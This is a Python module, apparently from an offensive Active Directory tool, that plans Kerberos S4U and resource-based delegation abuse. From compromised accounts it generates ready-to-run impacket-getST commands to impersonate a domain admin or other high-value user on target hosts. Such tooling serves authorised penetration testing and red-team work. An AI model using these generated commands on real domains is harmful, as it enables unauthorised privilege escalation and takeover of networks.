"""S4U / RBCD delegation-abuse planner.

`recon/acl_enum` turns delegation configuration into graph edges:

- **AllowedToDelegate** — a principal is trusted for *constrained* delegation to a
  service (msDS-AllowedToDelegateTo). It can S4U2Proxy to that service as anyone.
- **AddAllowedToAct** — a principal is listed in a computer's
  msDS-AllowedToActOnBehalfOfOtherIdentity (*resource-based* constrained
  delegation). It can S4U2Self+S4U2Proxy to that computer as anyone.

This module reads those edges and, for the accounts you already control (marked
owned in the graph — e.g. after `credentials/dcsync`), produces concrete
"impersonate the domain admin to this host" attack plans, each with the exact
`impacket getST` command to execute it.

By design it **plans, it does not fire** — no ticket is requested and nothing in
AD is modified (in particular it never writes an RBCD attribute). ADreaper maps
the abuse and hands you the command, the way BloodHound shows an edge's abuse
info; you run it with your ticket tool. Pure graph analysis — no network, no deps.
"""

from __future__ import annotations

from typing import Optional

from adreaper.core.context import EngagementContext
from adreaper.core.graph import EdgeType, NodeType
from adreaper.core.logging import log
from adreaper.core.module import BaseModule, ModuleResult, Option, OptionType, Severity


class S4U(BaseModule):
    name = "kerberos/s4u"
    description = "Plan S4U/RBCD delegation-abuse paths and emit ready-to-run getST commands."
    author = "Mealmeu"
    category = "kerberos"
    requires = []  # pure graph analysis
    references = [
        "https://attack.mitre.org/techniques/T1558/003/",
        "https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html",
    ]
    options = [
        Option("impersonate", "User to impersonate (default: a high-value user, else Administrator)",
               type=OptionType.STRING),
        Option("graph", "Load graph.json if the live graph is empty", type=OptionType.STRING),
    ]

    def run(self, ctx: EngagementContext) -> ModuleResult:
        res = self.result()
        graph = self._resolve_graph(ctx)
        if graph is None or len(graph) == 0:
            return res.fail("graph is empty — run recon/acl_enum first, or -o graph=<graph.json>").finish()

        impersonate = self.opt("impersonate") or pick_impersonation_target(graph)
        plans = plan_s4u_attacks(graph, ctx.domain or "DOMAIN", impersonate)
        if not plans:
            res.add_finding("No constrained/RBCD delegation edges found", Severity.INFO,
                            description="Nothing to abuse via S4U. Run recon/acl_enum to collect "
                                        "delegation edges first.")
            return res.finish()

        controllable = [p for p in plans if p["controllable"]]
        log.ok("%d delegation-abuse plan(s); %d immediately actionable (controller owned)",
               len(plans), len(controllable))

        for p in plans:
            sev = Severity.CRITICAL if p["controllable"] else Severity.MEDIUM
            prefix = "Actionable" if p["controllable"] else "Potential"
            res.add_finding(
                f"{prefix} {p['kind']} delegation: {p['controller']} -> impersonate "
                f"{p['impersonate']} to {p['target_host']}",
                sev,
                description=(_describe(p) + ("" if p["controllable"] else
                            "  (you do not yet control the delegating account — own it first.)")),
                evidence=p["command"],
                target=p["target_host"],
                references=["https://attack.mitre.org/techniques/T1558/003/"],
            )
        res.data["plans"] = plans
        res.data["actionable"] = len(controllable)
        return res.finish()

    def _resolve_graph(self, ctx: EngagementContext):
        if len(ctx.graph):
            return ctx.graph
        from pathlib import Path
        from adreaper.core.graph import ADGraph
        gpath = self.opt("graph") or ""
        if not gpath:
            candidate = ctx.loot_dir() / "graph.json"
            gpath = str(candidate) if candidate.exists() else ""
        if gpath and Path(gpath).exists():
            ctx.graph.merge(ADGraph.load(gpath))
        return ctx.graph if len(ctx.graph) else None


# ---------------------------------------------------------------------------
# pure logic (unit-tested)
# ---------------------------------------------------------------------------

def pick_impersonation_target(graph) -> str:
    """The juiciest user to impersonate: a high-value *user*, else Administrator."""
    for n in graph.nodes_of(NodeType.USER):
        if n.properties.get("high_value"):
            return n.name
    return "Administrator"


def plan_s4u_attacks(graph, domain: str, impersonate: str) -> list[dict]:
    """Build delegation-abuse plans from AllowedToDelegate / AddAllowedToAct edges.

    Actionable plans (controller already owned) are sorted first.
    """
    owned = {n.id for n in graph.owned_nodes()}
    plans: list[dict] = []
    for e in graph.edges:
        if e.type == EdgeType.ALLOWED_TO_DELEGATE:
            controller = graph.get(e.source)
            target = graph.get(e.target)
            spn = e.properties.get("spn") or f"cifs/{_host(target, e.target)}"
            plans.append(_plan("constrained", controller, e.source, owned,
                               _host(target, e.target), spn, domain, impersonate))
        elif e.type == EdgeType.ADD_ALLOWED_TO_ACT:
            controller = graph.get(e.source)
            victim = graph.get(e.target)
            host = _host(victim, e.target)
            plans.append(_plan("rbcd", controller, e.source, owned,
                               host, f"cifs/{host}", domain, impersonate))
    plans.sort(key=lambda p: (not p["controllable"], p["kind"], p["controller"]))
    return plans


def _plan(kind, controller_node, controller_id, owned, host, spn, domain, impersonate) -> dict:
    controller = controller_node.name if controller_node else controller_id
    return {
        "kind": kind,
        "controller": controller,
        "controller_id": controller_id,
        "controllable": controller_id in owned,
        "impersonate": impersonate,
        "target_host": host,
        "spn": spn,
        "command": _getst_command(domain, controller, impersonate, spn, kind),
    }


def _getst_command(domain: str, controller: str, impersonate: str, spn: str, kind: str) -> str:
    account = controller.rstrip("$")
    extra = " -additional-ticket ..." if kind == "rbcd" else ""
    return (f"impacket-getST -spn '{spn}' -impersonate '{impersonate}'{extra} "
            f"'{domain}/{account}:<password-or-hash>'")


def _describe(p: dict) -> str:
    if p["kind"] == "rbcd":
        return (f"{p['controller']} is trusted for resource-based delegation on {p['target_host']}; "
                f"S4U2Self+S4U2Proxy yields a service ticket to {p['target_host']} as "
                f"{p['impersonate']}.")
    return (f"{p['controller']} is trusted for constrained delegation to {p['spn']}; S4U2Proxy "
            f"yields a service ticket as {p['impersonate']}.")


def _host(node, fallback_id: str) -> str:
    if node is not None:
        dns = node.properties.get("dns")
        return str(dns) if dns else node.name.rstrip("$")
    return fallback_id
